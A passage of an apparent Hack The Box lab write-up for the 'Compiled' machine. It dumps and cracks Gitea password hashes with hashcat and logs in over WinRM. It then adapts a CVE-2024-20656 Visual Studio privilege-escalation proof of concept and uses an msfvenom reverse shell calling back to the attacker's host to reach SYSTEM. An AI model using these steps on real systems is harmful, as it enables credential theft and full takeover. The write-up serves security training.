action_task                protected_branch         
action_task_output         protected_tag            
action_task_step           public_key               
action_tasks_version       pull_auto_merge          
action_variable            pull_request             
app_state                  push_mirror              
attachment                 reaction                 
badge                      release                  
branch                     renamed_branch           
collaboration              repo_archiver            
comment                    repo_indexer_status      
commit_status              repo_redirect            
commit_status_index        repo_topic               
dbfs_data                  repo_transfer            
dbfs_meta                  repo_unit                
deploy_key                 repository               
email_address              review                   
email_hash                 review_state             
external_login_user        secret                   
follow                     session                  
gpg_key                    star                     
gpg_key_import             stopwatch                
hook_task                  system_setting           
issue                      task                     
issue_assignees            team                     
issue_content_history      team_invite              
issue_dependency           team_repo                
issue_index                team_unit                
issue_label                team_user                
issue_user                 topic                    
issue_watch                tracked_time             
label                      two_factor               
language_stat              upload                   
lfs_lock                   user                     
lfs_meta_object            user_badge               
login_source               user_open_id             
milestone                  user_redirect            
mirror                     user_setting             
notice                     version                  
notification               watch                    
oauth2_application         webauthn_credential      
oauth2_authorization_code  webhook                  
oauth2_grant

```

`user` seems like on that might have password hashes:

```

sqlite> .headers on
sqlite> select * from user;
id|lower_name|name|full_name|email|keep_email_private|email_notifications_preference|passwd|passwd_hash_algo|must_change_password|login_type|login_source|login_name|type|location|website|rands|salt|language|description|created_unix|updated_unix|last_login_unix|last_repo_visibility|max_repo_creation|is_active|is_admin|is_restricted|allow_git_hook|allow_import_local|allow_create_organization|prohibit_login|avatar|avatar_email|use_custom_avatar|num_followers|num_following|num_stars|num_repos|num_teams|num_members|visibility|repo_admin_change_team_access|diff_view_style|theme|keep_activity_private
1|administrator|administrator||administrator@compiled.htb|0|enabled|1bf0a9561cf076c5fc0d76e140788a91b5281609c384791839fd6e9996d3bbf5c91b8eee6bd5081e42085ed0be779c2ef86d|pbkdf2$50000$50|0|0|0||0|||6e1a6f3adbe7eab92978627431fd2984|a45c43d36dce3076158b19c2c696ef7b|en-US||1716401383|1716669640|1716669640|0|-1|1|1|0|0|0|1|0||administrator@compiled.htb|0|0|0|0|0|0|0|0|0||arc-green|0
2|richard|richard||richard@compiled.htb|0|enabled|4b4b53766fe946e7e291b106fcd6f4962934116ec9ac78a99b3bf6b06cf8568aaedd267ec02b39aeb244d83fb8b89c243b5e|pbkdf2$50000$50|0|0|0||0|||2be54ff86f147c6cb9b55c8061d82d03|d7cf2c96277dd16d95ed5c33bb524b62|en-US||1716401466|1720089561|1720089548|0|-1|1|0|0|0|0|1|0||richard@compiled.htb|0|0|0|0|2|0|0|0|0||arc-green|0
4|emily|emily||emily@compiled.htb|0|enabled|97907280dc24fe517c43475bd218bfad56c25d4d11037d8b6da440efd4d691adfead40330b2aa6aaf1f33621d0d73228fc16|pbkdf2$50000$50|1|0|0||0|||0056552f6f2df0015762a4419b0748de|227d873cca89103cd83a976bdac52486|||1716565398|1716567763|0|0|-1|1|0|0|0|0|1|0||emily@compiled.htb|0|0|0|0|0|0|0|2|0||arc-green|0
6|0xdf|0xdf||0xdf@compiled.htb|0|enabled|16d47698acf90f528436af0be7e1511722f6a8fa386ae9069de8cd37515dcd06b0d1eece19301077159b8349640efce856ae|pbkdf2$50000$50|0|0|0||0|||889dab110298e54d01216be5ed8dbf0d|47ca2228e32cf440c431972244fca55f|en-US||1722353741|1722353814|1722353741|0|-1|1|0|0|0|0|1|0||0xdf@compiled.htb|0|0|0|0|2|0|0|0|0||arc-green|0

```

emily and administrator are users! I’ll get the hashes in a cleaner format:

```

sqlite> select name, passwd, passwd_hash_algo from user;
name|passwd|passwd_hash_algo
administrator|1bf0a9561cf076c5fc0d76e140788a91b5281609c384791839fd6e9996d3bbf5c91b8eee6bd5081e42085ed0be779c2ef86d|pbkdf2$50000$50
richard|4b4b53766fe946e7e291b106fcd6f4962934116ec9ac78a99b3bf6b06cf8568aaedd267ec02b39aeb244d83fb8b89c243b5e|pbkdf2$50000$50
emily|97907280dc24fe517c43475bd218bfad56c25d4d11037d8b6da440efd4d691adfead40330b2aa6aaf1f33621d0d73228fc16|pbkdf2$50000$50
0xdf|16d47698acf90f528436af0be7e1511722f6a8fa386ae9069de8cd37515dcd06b0d1eece19301077159b8349640efce856ae|pbkdf2$50000$50

```

### Crack Gitea Hash

#### Get Format

The hash format for PBKDF2 on the [example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) page for Hashcat looks like this:

![image-20240730131421203](/img/image-20240730131421203.png)

That’s not what I have here. A bit of searching about the Gitea hash format leads to [this post](https://hashcat.net/forum/thread-8391-post-44775.html#pid44775), which shows the format `hashcat` needs:

![image-20240730131538156](/img/image-20240730131538156.png)

From the database, I have the digest (`passwd`) and salt, as well as the algo field says `pbkdf2$50000$50`, which suggests the rounds or iterations is 50000. From the example hash, it seems clear that the salt and digest are in base64 format, not hex. That’s easy enough to generate:

```

oxdf@hacky$ sqlite3 gitea.db "select passwd from user" | while read hash; do echo "$hash" | xxd -r -p | base64; done
G/CpVhzwdsX8DXbhQHiKkbUoFgnDhHkYOf1umZbTu/XJG47ua9UIHkIIXtC+d5wu+G0=
S0tTdm/pRufikbEG/Nb0lik0EW7JrHipmzv2sGz4Voqu3SZ+wCs5rrJE2D+4uJwkO14=
l5BygNwk/lF8Q0db0hi/rVbCXU0RA32LbaRA79TWka3+rUAzCyqmqvHzNiHQ1zIo/BY=
FtR2mKz5D1KENq8L5+FRFyL2qPo4aukGnejNN1FdzQaw0e7OGTAQdxWbg0lkDvzoVq4=

```

That is getting each `passwd` field, using `xxd` to convert from hex to raw binary data, and then `base64` to encode it. I can make that loop a bit more complex and get the full hashcat format:

```

oxdf@hacky$ sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes
administrator:sha256:50000:pFxD023OMHYVixnCxpbvew==:G/CpVhzwdsX8DXbhQHiKkbUoFgnDhHkYOf1umZbTu/XJG47ua9UIHkIIXtC+d5wu+G0=
richard:sha256:50000:188slid90W2V7Vwzu1JLYg==:S0tTdm/pRufikbEG/Nb0lik0EW7JrHipmzv2sGz4Voqu3SZ+wCs5rrJE2D+4uJwkO14=
emily:sha256:50000:In2HPMqJEDzYOpdr2sUkhg==:l5BygNwk/lF8Q0db0hi/rVbCXU0RA32LbaRA79TWka3+rUAzCyqmqvHzNiHQ1zIo/BY=
0xdf:sha256:50000:R8oiKOMs9EDEMZciRPylXw==:FtR2mKz5D1KENq8L5+FRFyL2qPo4aukGnejNN1FdzQaw0e7OGTAQdxWbg0lkDvzoVq4=

```

I’m using `tee` to save these to a file as well as display them.

#### Hashcat

With that right format, `hashcat` will recognize these and start cracking them (giving it `--user` because my hashes start with the username and a `:`):

```

oxdf@corum:~/hackthebox/compiled-10.10.11.26$ hashcat gitea.hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --user
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

10900 | PBKDF2-HMAC-SHA256 | Generic KDF
...[snip]...
sha256:50000:In2HPMqJEDzYOpdr2sUkhg==:l5BygNwk/lF8Q0db0hi/rVbCXU0RA32LbaRA79TWka3+rUAzCyqmqvHzNiHQ1zIo/BY=:12345678
...[snip]...
oxdf@corum:~/hackthebox/compiled-10.10.11.26$ hashcat gitea.hashes --show --user
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

10900 | PBKDF2-HMAC-SHA256 | Generic KDF

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

emily:sha256:50000:In2HPMqJEDzYOpdr2sUkhg==:l5BygNwk/lF8Q0db0hi/rVbCXU0RA32LbaRA79TWka3+rUAzCyqmqvHzNiHQ1zIo/BY=:12345678

```

Only one cracks, but it’s emily’s.

### WinRM

WinRM is open, and Emily can connect to it:

```

oxdf@hacky$ evil-winrm -u emily -p 12345678 -i 10.10.11.26

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Emily\Documents>

```

And recover `user.txt`:

```
*Evil-WinRM* PS C:\Users\Emily\desktop> type user.txt
c2aaa812************************

```

## Shell as system

### Enumeration

With access as Emily, there’s not much new I can access that I couldn’t before. There’s a hint from initial enumeration in the web application’s Git README:

![image-20240730143016682](/img/image-20240730143016682.png)

The exploit so far had nothing to do with Visual Studio. So that’s worth checking out.

[This Stackoverflow post](https://stackoverflow.com/a/65204000) has the command to get the current version of Visual Studio:

```
*Evil-WinRM* PS C:\Program Files (x86)\Microsoft Visual Studio> .\Installer\vswhere.exe -property catalog_productDisplayVersion
16.10.0

```

### CVE-2024-20656

#### Background

Research into CVEs in Visual Studio leads to [CVE-2024-20656](https://nvd.nist.gov/vuln/detail/CVE-2024-20656), which has a not so helpful description:

> Visual Studio Elevation of Privilege Vulnerability

[This post](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) from MDSec does into great detail about how the vulnerability was discovered and how the exploit was developed. The vulnerability is in the VSStandardCollectorService150 service, which runs as SYSTEM. This service is responsible for handling debugging of code run by Visual Studio.

The blog post has a nice set of bullet points at the end that summarize the exploitation process:

> With this we have all pieces for our exploit, to summarise:
>
> - Create a dummy directory where the *VSStandardCollectorService150* will write files.
> - Create a junction directory that points to a newly created directory.
> - Trigger the *VSStandardCollectorService150* service by creating a new diagnostic session.
> - Wait for the `<GUID>.scratch` directory to be created and create new object manager symbolic link `Report.<GUID>.diagsession` that points to `C:\\ProgramData` .
> - Stop the diagnostic session.
> - Wait for the `Report.<GUID>.diagsession` file to be moved to the parent directory and switch the junction directory to point to `\\RPC Control` where our symbolic link is waiting.
> - Sleep for 5 seconds (not really important but left it there).
> - Switch the junction directory to point to a dummy directory.
> - Start a new diagnostic session.
> - Wait for `<GUID>.scratch` directory to be created and create a new object manager symbolic link `Report.<GUID>.diagsession` that points to `C:\\ProgramData\\Microsoft`
> - Stop the diagnostic session.
> - Wait for the `Report.<GUID>.diagsession` file to be moved to parent directory and switch the junction directory to point to `\\RPC Control` where our symbolic link is waiting.
> - After the permissions are changed we delete the `C:\\ProgramData\\Microsoft\\VisualStudio\\SetupWMI\\MofCompiler.exe` binary.
> - Locate and run the `Setup WMI provider` in repair mode.
> - Wait for our new `MofCompiler.exe` binary to be created by the installer and replace it with cmd.exe
> - Enjoy SYSTEM shell 🙂

I’ll note that the end result is that a binary is replaced by `cmd.exe` and then it’s run as SYSTEM.

#### Exploit Modifications

There’s a [POC exploit](https://github.com/Wh04m1001/CVE-2024-20656) from the same author as the blog post. The `main.cpp` script is a few hundred lines long, and unfortunately, compiling and running it will just fail. On closer inspection of the code, there are two issues.

The first thing I’ll look at is all the strings, especially the paths, to make sure they exist on target.

The first issue is on line 4:

[![image-20240730175330639](/img/image-20240730175330639.png)*Click for full size image*](/img/image-20240730175330639.png)

The Visual Studio install is in `Program File (x86)`, not `Program Files`, and it’s a 2019 install, not 2022:

```
*Evil-WinRM* PS C:\Program Files (x86)\Microsoft Visual Studio> ls

    Directory: C:\Program Files (x86)\Microsoft Visual Studio

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         1/29/2024   9:07 PM                2019
d-----         1/20/2024   1:57 AM                Installer
d-----         1/20/2024   2:04 AM                Shared
*Evil-WinRM* PS C:\Program Files (x86)\Microsoft Visual Studio> ls "2019\Community\Team Tools\DiagnosticsHub\Collector\"

    Directory: C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\Team Tools\DiagnosticsHub\Collector

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         1/20/2024   2:04 AM                AgentConfigs
d-----         1/20/2024   2:13 AM                Agents
d-----         1/20/2024   2:04 AM                amd64
d-----         1/20/2024   2:04 AM                x86
-a----         1/20/2024   2:04 AM          17800 DiagnosticsHub.Packaging.Interop.dll
-a----         1/20/2024   2:04 AM          18312 DiagnosticsHub.StandardCollector.Host.Interop.dll
-a----         1/20/2024   2:04 AM          19336 DiagnosticsHub.StandardCollector.Interop.dll
-a----         1/20/2024   2:04 AM         450440 DiagnosticsHub.StandardCollector.Runtime.dll
-a----         1/20/2024   2:04 AM         257856 KernelTraceControl.dll
-a----         1/20/2024   2:04 AM          43384 Microsoft.DiagnosticsHub.Packaging.InteropEx.dll
-a----         1/20/2024   2:04 AM         675752 Newtonsoft.Json.dll
-a----         1/20/2024   2:04 AM         124840 VSDiagnostics.exe

```

I’ll update that line to:

```

WCHAR cmd[] = L"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\Team Tools\\DiagnosticsHub\\Collector\\VSDiagnostics.exe";

```

I’ll also want to replace what gets run. That takes place in the `cb1` function that starts on line 182:

```

void cb1()
{
    printf("[*] Oplock!\n");
    while (!Move(hFile2)) {}
    printf("[+] File moved!\n");
    CopyFile(L"c:\\windows\\system32\\cmd.exe", L"C:\\ProgramData\\Microsoft\\VisualStudio\\SetupWMI\\MofCompiler.exe", FALSE);
    finished = TRUE;
}

```

Like the bullet points said, it’s copying `cmd.exe` over `MofCompiler.exe` before running that as SYSTEM. I’ll update it to copy a binary I can control:

```

void cb1()
{
    printf("[*] Oplock!\n");
    while (!Move(hFile2)) {}
    printf("[+] File moved!\n");
    CopyFile(L"c:\\programdata\\r.exe", L"C:\\ProgramData\\Microsoft\\VisualStudio\\SetupWMI\\MofCompiler.exe", FALSE);
    finished = TRUE;
}

```

With these two modifications, I’ll compile the exploit, which outputs as `CVE-2024-20656\Expl\x64\Release\Expl.exe`. It is important to compile a release version, not a debug version.

#### Files Prep

I’m going to need to upload three files to Compiled to make this work. First, I’ll need a reverse shell binary, which I’ll generate with `msfvenom`:

```

oxdf@hacky$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=443 -f exe -o rev-443.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: rev-443.exe

```

I’m going to upload that and `Expl.exe` to Compiled using a Python webserver:

```
*Evil-WinRM* PS C:\programdata> wget 10.10.14.6/Expl.exe -outfile e.exe
*Evil-WinRM* PS C:\programdata> wget 10.10.14.6/rev-444.exe -outfile r.exe

```

I’ll also need a copy of [RunasCs.exe](https://github.com/antonioCoco/RunasCs):

```
*Evil-WinRM* PS C:\programdata> wget 10.10.14.6/RunasCs.exe -outfile RunasCs.exe

```

The Evil-WinRM session doesn’t have credentials cached in it, but rather is just executing single commands over an HTTP interface. This means it can’t run the exploit within a session as Emily.

To demonstrate this, I’ll check the configuration of the service that I’m going to exploit. In Evil-WinRM, it fails with access denied:

```
*Evil-WinRM* PS C:\programdata> sc.exe qc VSStandardCollectorService150
[SC] OpenService FAILED 5:

Access is denied.

```

But when I use `RunasCs.exe` to execute it as Emily, it works:

```
*Evil-WinRM* PS C:\programdata> .\RunasCs.exe Emily 12345678 'sc.exe qc VSStandardCollectorService150'

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: VSStandardCollectorService150
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : "C:\Program Files (x86)\Microsoft Visual Studio\Shared\Common\DiagnosticsHub.Collection.Service\StandardCollector.Service.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Visual Studio Standard Collector Service 150
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

```

### Exploit

With all three files, I’ll run `e.exe` with `RunasCs.exe`. It hangs for 30 seconds, before returning all the output at once:

```
*Evil-WinRM* PS C:\programdata> .\RunasCs.exe Emily 12345678 'C:\Programdata\e.exe'

[+] Junction \\?\C:\c2cb7808-2bfb-4b45-868d-9e00a21ad6dd -> \??\C:\00a2ec86-5840-4b82-bec8-390d2b423ff6 created!
[+] Symlink Global\GLOBALROOT\RPC Control\Report.0197E42F-003D-4F91-A845-6404CF289E84.diagsession -> \??\C:\Programdata created!
[+] Junction \\?\C:\c2cb7808-2bfb-4b45-868d-9e00a21ad6dd -> \RPC Control created!
[+] Junction \\?\C:\c2cb7808-2bfb-4b45-868d-9e00a21ad6dd -> \??\C:\00a2ec86-5840-4b82-bec8-390d2b423ff6 created!
[+] Symlink Global\GLOBALROOT\RPC Control\Report.0297E42F-003D-4F91-A845-6404CF289E84.diagsession -> \??\C:\Programdata\Microsoft created!
[+] Junction \\?\C:\c2cb7808-2bfb-4b45-868d-9e00a21ad6dd -> \RPC Control created!
[+] Persmissions successfully reseted!
[*] Starting WMI installer.
[*] Command to execute: C:\windows\system32\msiexec.exe /fa C:\windows\installer\8ad86.msi
[*] Oplock!
[+] File moved!

```

At my `nc` listener, there’s a shell:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.26 63358
Microsoft Windows [Versin 10.0.19045.4651]
(c) Microsoft Corporation. Todos los derechos reservados.

C:\ProgramData\Microsoft\VisualStudio\SetupWMI> whoami
nt authority\system

```

And I can grab `root.txt`:

```

C:\Users\Administrator\Desktop> type root.txt
959f11a6************************

```